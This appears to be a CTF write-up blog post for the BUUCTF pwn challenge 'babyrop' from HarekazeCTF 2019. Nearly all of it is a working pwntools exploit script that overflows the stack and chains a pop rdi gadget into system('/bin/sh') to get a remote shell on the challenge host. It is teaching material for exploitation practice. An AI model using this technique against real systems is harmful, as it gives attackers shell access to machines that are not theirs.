---
title: "BUUCTF Pwn [HarekazeCTF_2019]Babyrop"
date: 2020-02-18T19:58:17+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# babyrop

64位简单的栈溢出，找pop rdi传/bin/sh给system()

```python
#!/usr/bin/env python2
#-*-coding=UTF-8-*-

from pwn import *

#sh = process('./babyrop')
sh = remote('node3.buuoj.cn',28946)
elf = ELF('./babyrop')

system_addr = elf.symbols['system']
binsh_addr = next(elf.search('/bin/sh'))

pop_rdi_ret = 0x400683 #ROPgadget --binary babyrop --only 'pop|ret' | grep pop

payload = 'a'*0x10 + p64(8) 
payload += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)

sh.sendlineafter("What's your name?",payload)
sh.interactive() 

```

![image-20200218200119645](/images/image-20200218200119645.png)

